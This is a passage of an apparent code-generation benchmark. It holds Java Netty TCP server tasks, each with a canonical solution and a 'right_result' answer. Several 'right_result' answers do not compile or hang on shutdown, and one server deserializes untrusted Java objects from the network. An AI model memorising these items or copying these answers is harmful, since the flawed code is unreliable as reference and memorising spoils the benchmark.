    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections, process requests, and manage server resources efficiently.\n\nClass Description: The MyServer class represents a Netty-based TCP server that listens on a specified port, handles incoming connections using NIO, processes client requests through a pipeline of handlers, and properly manages server resources during startup and shutdown.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nMyServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() throws Exception -> void - Starts the Netty server, configures the server bootstrap with event loop groups, channel type, pipeline handlers, and socket options. Binds to the specified port and keeps the server running until shutdown is triggered. Properly releases resources during shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class MyServer {\n\n    private int port;\n\n    public MyServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(\"decoder\", new MyDecoder());\n                     ch.pipeline().addLast(\"encoder\", new MyEncoder());\n                     ch.pipeline().addLast(new MyServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class MyServer {\n    private final int port;\n\n    public MyServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     // Add your handlers here\n                     p.addLast(new MyServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = 8080; // Default port\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n\n        new MyServer(port).run();\n    }\n}\n```"
  },
  {
    "Task_id": 204,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle object serialization and deserialization for client-server communication, with optional SSL support.\n\nClass Description: ObjectEchoServer is a Netty-based TCP server that listens for incoming connections, handles object serialization/deserialization, and echoes received objects back to clients. It supports optional SSL encryption and uses NIO for non-blocking I/O operations.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL encryption should be enabled\n- PORT: [int] - The port number on which the server will listen for connections\n- sslCtx: [SslContext] - SSL context for secure communication (nullable)\n\nMethods:\n- start(): [void] - Starts the Netty server, configures the pipeline with necessary handlers (SSL, object encoder/decoder, and business logic handler), and binds to the specified port. Handles resource cleanup on shutdown.\n  Input: None\n  Output: None (throws Exception if startup fails)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.serialization.ClassResolvers;\nimport io.netty.handler.codec.serialization.ObjectDecoder;\nimport io.netty.handler.codec.serialization.ObjectEncoder;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class ObjectEchoServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    if (sslCtx != null) {\n                        p.addLast(sslCtx.newHandler(ch.alloc()));\n                    }\n                    p.addLast(\n                            new ObjectEncoder(),\n                            new ObjectDecoder(ClassResolvers.cacheDisabled(null)),\n                            new ObjectEchoServerHandler());\n                }\n             });\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.serialization.ObjectDecoder;\nimport io.netty.handler.codec.serialization.ObjectEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class ObjectEchoServer {\n    private final boolean SSL;\n    private final int PORT;\n    private SslContext sslCtx = null;\n\n    public ObjectEchoServer(boolean SSL, int PORT) throws Exception {\n        this.SSL = SSL;\n        this.PORT = PORT;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        }\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new ObjectDecoder(ClassResolvers.cacheDisabled(null)));\n                     p.addLast(new ObjectEncoder());\n                     p.addLast(new BusinessLogicHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private static class BusinessLogicHandler extends SimpleChannelInboundHandler<Object> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n            ctx.writeAndFlush(msg);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 205,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling incoming client connections and messages, with proper initialization and graceful shutdown.\n\nClass Description: NettyServer is a Spring component that sets up and manages a Netty-based TCP server. It handles server lifecycle including startup and shutdown, and delegates incoming connection handling to a specified handler initializer.\n\nAttributes:\n- logger: Logger - SLF4J logger for logging server events\n- port: Integer - Port number on which the server will listen (injected from configuration)\n- nettyServerHandlerInitializer: NettyServerHandlerInitializer - Handler for initializing channel pipelines (Spring-injected)\n- bossGroup: EventLoopGroup - Netty event loop group for accepting connections\n- workerGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- channel: Channel - Active server channel instance\n\nMethods:\n- start() -> void - Initializes and starts the Netty server (annotated with @PostConstruct)\n  - Input: None\n  - Output: None\n  - Throws: InterruptedException if thread is interrupted during startup\n- shutdown() -> void - Gracefully shuts down the server (annotated with @PreDestroy)\n  - Input: None\n  - Output: None",
    "Canonical_solution": "import cn.iocoder.springboot.lab67.nettyserverdemo.server.handler.NettyServerHandlerInitializer;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport java.net.InetSocketAddress;\n\n@Component\npublic class NettyServer {\n\n    private Logger logger = LoggerFactory.getLogger(getClass());\n\n    @Value(\"${netty.port}\")\n    private Integer port;\n\n    @Autowired\n    private NettyServerHandlerInitializer nettyServerHandlerInitializer;\n\n    private EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private Channel channel;\n\n    @PostConstruct\n    public void start() throws InterruptedException {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .localAddress(new InetSocketAddress(port))\n                .option(ChannelOption.SO_BACKLOG, 1024)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childOption(ChannelOption.TCP_NODELAY, true)\n                .childHandler(nettyServerHandlerInitializer);\n        ChannelFuture future = bootstrap.bind().sync();\n        if (future.isSuccess()) {\n            channel = future.channel();\n            logger.info(\"[start][Netty Server started on port {}]\", port);\n        }\n    }\n\n    @PreDestroy\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class NettyServer {\n\n    private static final Logger logger = LoggerFactory.getLogger(NettyServer.class);\n\n    @Value(\"${server.port}\")\n    private int port;\n\n    private NettyServerHandlerInitializer nettyServerHandlerInitializer;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel channel;\n\n    public NettyServer(NettyServerHandlerInitializer nettyServerHandlerInitializer) {\n        this.nettyServerHandlerInitializer = nettyServerHandlerInitializer;\n    }\n\n    @PostConstruct\n    public void start() throws InterruptedException {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(nettyServerHandlerInitializer)\n         .option(ChannelOption.SO_BACKLOG, 128)\n         .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        channel = b.bind(port).sync().channel();\n        logger.info(\"Server started on port {}\", port);\n    }\n\n    @PreDestroy\n    public void shutdown() {\n        if (channel != null) {\n            channel.closeFuture().syncUninterruptibly();\n        }\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n        logger.info(\"Server shut down\");\n    }\n}\n```"
  },
  {
    "Task_id": 206,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and messages.\n\nClass Description: SimpleChatServer is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses a boss-worker thread model to handle connections efficiently and provides basic server configuration options.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nSimpleChatServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() -> void - Starts the server, binds it to the specified port, and keeps it running until shutdown. Handles resource cleanup during shutdown. Throws Exception if any error occurs during server startup or operation.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class SimpleChatServer {\n\n    private int port;\n\n    public SimpleChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new SimpleChatServerInitializer())\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n            \n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class SimpleChatServer {\n    private final int port;\n\n    public SimpleChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     // Add your handler here\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = 8080; // Default port\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        new SimpleChatServer(port).run();\n    }\n}\n```"
  },
  {
    "Task_id": 207,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process their requests.\n\nClass Description: UptimeServer is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses a boss-worker thread model to handle connections efficiently and includes logging for server events. The server remains active until explicitly shut down.\n\nAttributes:\n- PORT: int - The port number on which the server listens for incoming connections (default: 8080)\n- handler: UptimeServerHandler - The custom handler that processes incoming client requests\n\nMethods:\n- main: main(String[] args) -> void - The entry point of the application that configures and starts the Netty server\n  - args: String[] - Command line arguments (unused in this implementation)\n  - throws Exception - May throw exceptions during server startup or operation\n\nThe server uses two NioEventLoopGroups:\n1. bossGroup: Handles accepting new connections\n2. workerGroup: Handles processing of established connections\n\nThe server configuration includes:\n- Channel type: NioServerSocketChannel\n- Logging handler: LogLevel.INFO\n- Custom channel initializer that adds the UptimeServerHandler to the pipeline\n\nThe server binds to the specified port and remains running until shutdown. Resources are cleaned up gracefully on shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic final class UptimeServer {\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8080\"));\n    private static final UptimeServerHandler handler = new UptimeServerHandler();\n\n    public static void main(String[] args) throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .handler(new LoggingHandler(LogLevel.INFO))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(handler);\n                        }\n                    });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic class UptimeServer {\n    private static final int PORT = 8080;\n    private UptimeServerHandler handler;\n\n    public UptimeServer(UptimeServerHandler handler) {\n        this.handler = handler;\n    }\n\n    public static void main(String[] args) throws Exception {\n        UptimeServerHandler handler = new UptimeServerHandler();\n        UptimeServer server = new UptimeServer(handler);\n        server.start();\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(handler);\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 208,
    "Instruction": "Task Description: Implement a Java class that creates a TCP server using Netty framework to handle HTTP file server functionality, including starting the server, configuring network options, and properly shutting down resources.\n\nClass Description: LoFileServer is a Netty-based HTTP file server that listens on a specified port, handles incoming HTTP requests, and manages server lifecycle operations. It uses Netty's non-blocking I/O model for high performance and includes proper resource cleanup.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\nchannel: Channel - The Netty channel representing the server's listening socket\nLogger: Logger - SLF4J logger instance for logging server events\n\nMethods:\nstart(): void - Starts the Netty server on the specified port. Configures thread groups, channel options, and HTTP pipeline handlers. Throws InterruptedException if the port is already in use or if startup fails.\nshutdown(): void - Gracefully shuts down the server by closing the channel and releasing all associated resources. Handles any interruption during shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class LoFileServer {\n    private static final Logger Logger = LoggerFactory.getLogger(LoFileServer.class);\n    private int port;\n    private Channel channel;\n\n    public LoFileServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        final EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        final EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            final ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 1024)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .option(ChannelOption.SO_SNDBUF, 1024*1024*10)\n                .option(ChannelOption.SO_RCVBUF, 1024*1024*10)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel socketChannel) throws Exception {\n                        socketChannel.pipeline().addLast(new HttpRequestDecoder());\n                        socketChannel.pipeline().addLast(new HttpResponseEncoder());\n                        socketChannel.pipeline().addLast(new ChunkedWriteHandler());\n                        socketChannel.pipeline().addLast(new HttpObjectAggregator(100 * 1024 * 1024));\n                        socketChannel.pipeline().addLast(new HttpFileServerHandler());\n                    }\n                });\n            \n            channel = b.bind(port).sync().channel();\n            Logger.info(\"Server started on port [{}]\", port);\n        } catch (Exception e) {\n            Logger.error(\"Port {} is already in use\", port);\n            throw e;\n        }\n    }\n\n    public void shutdown() {\n        if (this.channel != null) {\n            this.channel.close();\n            try {\n                this.channel.closeFuture().sync();\n            } catch (InterruptedException e) {\n                Logger.error(\"Error during server shutdown\", e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class LoFileServer {\n    private final int port;\n    private Channel channel;\n    private static final Logger logger = LoggerFactory.getLogger(LoFileServer.class);\n\n    public LoFileServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new LoggingHandler(LogLevel.INFO));\n                     p.addLast(new HttpRequestDecoder());\n                     p.addLast(new HttpResponseEncoder());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new FileServerHandler());\n                 }\n             });\n\n            channel = b.bind(port).sync().channel();\n            logger.info(\"HTTP file server started on port {}\", port);\n        } catch (Exception e) {\n            logger.error(\"Failed to start HTTP file server\", e);\n            throw e;\n        }\n    }\n\n    public void shutdown() {\n        if (channel != null && channel.isActive()) {\n            channel.close();\n        }\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n        logger.info(\"HTTP file server shut down\");\n    }\n}\n```"
  },
  {
    "Task_id": 209,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling incoming client connections, processing requests through a configurable message handler, and managing server resources efficiently.\n\nClass Description: NettyServer is a TCP server implementation using Netty framework that extends AbstractServer. It manages server lifecycle (opening/closing), handles incoming connections with configurable thread pools, and processes messages through a provided message handler. The server supports connection management, configurable worker threads, and graceful shutdown.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection events\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations for established connections\n- serverChannel: [Channel] - Represents the server's listening channel\n- messageHandler: [MessageHandler] - Processes incoming requests\n- standardThreadExecutor: [StandardThreadExecutor] - Manages worker threads for request processing\n- rejectCounter: [AtomicInteger] - Tracks rejected requests count\n- channelManage: [NettyServerChannelManage] - Manages active connections\n\nMethods:\n- open() -> [boolean] - Starts the server, initializes thread pools, binds to port, and sets up channel pipeline. Returns true if successful.\n- close() -> [void] - Shuts down the server gracefully, releasing all resources including thread pools and channels.\n- isBound() -> [boolean] - Checks if server is actively listening for connections.\n- request(Request) -> [Response] - Throws MotanFrameworkException as server doesn't support direct requests (inherited from AbstractServer).\n\nInput:\n- URL url: Configuration parameters for server setup (port, thread counts, queue sizes etc.)\n- MessageHandler messageHandler: Handler for processing incoming messages\n\nOutput:\n- When open() succeeds: Server starts listening on specified port and returns true\n- When close() completes: All server resources are released and state set to CLOSE\n- isBound(): Returns current server binding status",
    "Canonical_solution": "import com.weibo.api.motan.common.ChannelState;\nimport com.weibo.api.motan.common.MotanConstants;\nimport com.weibo.api.motan.common.URLParamType;\nimport com.weibo.api.motan.core.DefaultThreadFactory;\nimport com.weibo.api.motan.core.StandardThreadExecutor;\nimport com.weibo.api.motan.exception.MotanFrameworkException;\nimport com.weibo.api.motan.rpc.Request;\nimport com.weibo.api.motan.rpc.Response;\nimport com.weibo.api.motan.rpc.URL;\nimport com.weibo.api.motan.transport.AbstractServer;\nimport com.weibo.api.motan.transport.MessageHandler;\nimport com.weibo.api.motan.transport.TransportException;\nimport com.weibo.api.motan.util.LoggerUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class NettyServer extends AbstractServer {\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel serverChannel;\n    private MessageHandler messageHandler;\n    private StandardThreadExecutor standardThreadExecutor;\n    private AtomicInteger rejectCounter = new AtomicInteger(0);\n    private NettyServerChannelManage channelManage;\n\n    public NettyServer(URL url, MessageHandler messageHandler) {\n        super(url);\n        this.messageHandler = messageHandler;\n    }\n\n    @Override\n    public boolean open() {\n        if (isAvailable()) {\n            LoggerUtil.warn(\"NettyServer ServerChannel already Open: url=\" + url);\n            return state.isAliveState();\n        }\n        if (bossGroup == null) {\n            bossGroup = new NioEventLoopGroup(1);\n            workerGroup = new NioEventLoopGroup();\n        }\n\n        LoggerUtil.info(\"NettyServer ServerChannel start Open: url=\" + url);\n        boolean shareChannel = url.getBooleanParameter(URLParamType.shareChannel.getName(), URLParamType.shareChannel.getBooleanValue());\n        final int maxContentLength = url.getIntParameter(URLParamType.maxContentLength.getName(), URLParamType.maxContentLength.getIntValue());\n        int maxServerConnection = url.getIntParameter(URLParamType.maxServerConnection.getName(), URLParamType.maxServerConnection.getIntValue());\n        int workerQueueSize = url.getIntParameter(URLParamType.workerQueueSize.getName(), URLParamType.workerQueueSize.getIntValue());\n\n        int minWorkerThread = shareChannel ? \n            url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MIN_WORKDER) :\n            url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MIN_WORKDER);\n        int maxWorkerThread = shareChannel ? \n            url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MAX_WORKDER) :\n            url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MAX_WORKDER);\n\n        standardThreadExecutor = new StandardThreadExecutor(minWorkerThread, maxWorkerThread, workerQueueSize, \n            new DefaultThreadFactory(\"NettyServer-\" + url.getServerPortStr(), true));\n        standardThreadExecutor.prestartAllCoreThreads();\n\n        channelManage = new NettyServerChannelManage(maxServerConnection);\n\n        ServerBootstrap serverBootstrap = new ServerBootstrap();\n        serverBootstrap.group(bossGroup, workerGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    